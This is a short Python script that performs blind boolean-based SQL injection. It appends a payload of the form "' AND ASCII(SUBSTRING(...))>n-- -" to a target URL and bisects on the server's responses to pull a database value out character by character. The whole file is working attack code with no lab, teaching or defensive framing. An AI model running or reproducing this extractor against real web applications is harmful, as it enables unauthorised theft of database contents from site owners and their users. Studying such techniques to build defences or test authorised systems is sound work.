import urllib.request
import urllib.parse
import re
import time

def blind_boolean_bisection(url, param, position, true_check, low=32, high=126):
    """Extract a single character at `position` via blind boolean bisection.
    `true_check(response_text) -> bool` determines if the injected condition was True.
    Returns the extracted character or None if not printable ASCII."""
    while low < high:
        mid = (low + high) >> 1
        # ASCII(SUBSTRING((...),pos,1)) > mid
        payload = "' AND ASCII(SUBSTRING((%s),%d,1))>%d-- -" % (param, position, mid)
        encoded = urllib.parse.quote(payload, safe='')
        req = urllib.request.Request(url + encoded)
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode('utf-8', errors='replace')
        except Exception:
            body = ''
        if true_check(body):
            low = mid + 1
        else:
            high = mid
    if low == high and 32 <= low <= 126:
        return chr(low)
    return None

def extract_string(url, param, max_len, true_check):
    """Extract up to max_len characters using bisection."""
    result = []
    for pos in range(1, max_len + 1):
        ch = blind_boolean_bisection(url, param, pos, true_check)
        if ch is None:
            break
        result.append(ch)
    return ''.join(result)

